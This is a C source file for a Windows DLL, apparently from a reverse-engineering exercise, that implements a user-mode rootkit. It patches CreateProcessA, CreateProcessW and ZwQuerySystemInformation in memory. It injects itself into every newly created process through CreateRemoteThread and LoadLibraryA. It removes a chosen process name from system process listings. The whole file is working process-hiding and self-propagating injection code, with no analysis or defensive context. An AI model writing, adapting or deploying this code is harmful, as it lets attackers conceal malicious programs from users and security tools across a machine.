#include <Windows.h>
#include <tchar.h>
#include <stdio.h>

#ifdef _DEBUG
#define STR_MODULE_NAME ("D:\\xiang\\prj\\vs_prj\\Injection\\Debug\\stealth3.dll")
#else
#define STR_MODULE_NAME("D:\\xiang\\prj\\vs_prj\\Injection\\Release\\stealth3.dll")
#endif
#define STATUS_SUCCESS	0x0000000L

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;


typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFOMATION)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


typedef BOOL(WINAPI *PFCREATEPROCESSA)(
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef BOOL(WINAPI *PFCREATEPROCESSW)(
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

#define DEF_NTDLL	("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFOMATION ("ZwQuerySystemInformation")

#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

BYTE g_pOrgBytes[5] = { 0, };

BYTE g_pOrgZwQSI[5] = { 0, };



BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;

	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	if (pByte[0] == 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	memcpy(pOrgBytes, pfnOrg, 5);

	dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	memcpy(pfnOrg, pBuf, 5);

	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;

}


BOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	BYTE pBuf2[2] = { 0xEB, 0xF9 };
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if (pByte[0] == 0xEB)
		return FALSE;

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	dwAddress = (DWORD)pfnNew - (DWORD)pFunc;
	memcpy(&pBuf[1], &dwAddress, 4);
	memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);

	memcpy(pFunc, pBuf2, 2);

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);

	return TRUE;
}


BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	if (pByte[0] != 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pFunc, pOrgBytes, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


BOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;
	BYTE pBuf[5] = { 0x90, 0x90, 0x90, 0x90, 0x90 };
	BYTE pBuf2[2] = { 0x8B, 0xFF };

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if (pByte[0] != 0xEB)
		return FALSE;

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);
	memcpy(pFunc, pBuf2, 2);
	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);

	return TRUE;

}


BOOL InjectDll2(HANDLE hProcess, LPCTSTR szDllName)
{
	HANDLE hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + 1) * sizeof(TCHAR);
	FARPROC pThreadProc;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,
		MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteBuf == NULL)
		return FALSE;

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName,
		dwBufSize, NULL);

	pThreadProc = GetProcAddress(GetModuleHandleA("kernel32.dll"),
		"LoadLibraryA");
	hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)pThreadProc,
		pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);

	return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = { 0, };

	unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFOMATION, g_pOrgBytes);

	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFOMATION);

	status = ((PFZWQUERYSYSTEMINFOMATION)pFunc)(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	if (SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (TRUE)
		{
			if (pCur->Reserved2[1] != NULL)
			{
				if (!_tcsicmp((PTSTR)pCur->Reserved2[1], g_szProcName))
				{
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					pPrev = pCur;
			}

			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);

		} // while
	}

__NTQUERYSYSTEMINFORMATION_END:
	hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFOMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

	return status;
}


BOOL WINAPI NewCreateProcessA(
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL bRet;
	FARPROC pFunc;


	pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
	pFunc = (FARPROC)((DWORD)pFunc + 2);
	bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation);


	if (bRet)
		InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

	return bRet;

}


BOOL WINAPI NewCreateProcessW(
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL bRet;
	FARPROC pFunc;

	
	pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessW");
	pFunc = (FARPROC)((DWORD)pFunc + 2);
	bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation);

	
	if (bRet)
		InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

	return bRet;
}



BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	char szCurProc[MAX_PATH] = { 0, };
	char *p = NULL;

	GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
	p = strrchr(szCurProc, '\\');
	if ((p != NULL) && !stricmp(p + 1, "HideProc.exe"))
		return TRUE;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		hook_by_hotpatch("kernel32.dll", "CreateProcessA",
			(PROC)NewCreateProcessA);
		hook_by_hotpatch("kernel32.dll", "CreateProcessW",
			(PROC)NewCreateProcessW);
		hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFOMATION,
			(PROC)NewZwQuerySystemInformation, g_pOrgBytes);
		break;
	case DLL_PROCESS_DETACH:
		unhook_by_hotpatch("kernel32.dll", "CreateProcessA");
		unhook_by_hotpatch("kernel32.dll", "CreateProcessW");
		unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFOMATION,
			g_pOrgBytes);
		break;
	}

	return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif

	__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
	{
		_tcscpy(g_szProcName, szProcName);
	}
#ifdef __cplusplus
}
#endif


